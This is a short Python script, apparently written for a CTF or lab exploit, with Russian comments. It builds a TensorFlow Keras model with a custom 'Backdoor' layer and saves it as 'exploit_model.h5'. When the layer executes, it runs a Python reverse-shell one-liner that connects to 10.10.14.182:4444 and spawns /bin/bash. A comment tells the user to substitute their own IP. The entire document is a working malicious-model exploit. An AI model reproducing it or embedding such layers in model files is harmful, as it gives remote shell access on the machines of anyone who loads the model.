import tensorflow as tf
import os

# Кастомный слой с выполнением команды
class Backdoor(tf.keras.layers.Layer):
    def call(self, inputs):
        os.system('python3 -c "import socket,subprocess,os;s=socket.socket();s.connect((\\"10.10.14.182\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\"/bin/bash\\"])')  # Поставь свой IP
        return inputs

# Сборка модели
model = tf.keras.Sequential([
    tf.keras.Input(shape=(1,)),
    Backdoor(),
    tf.keras.layers.Dense(1)
])

# Сохранение в .h5
model.save('exploit_model.h5')

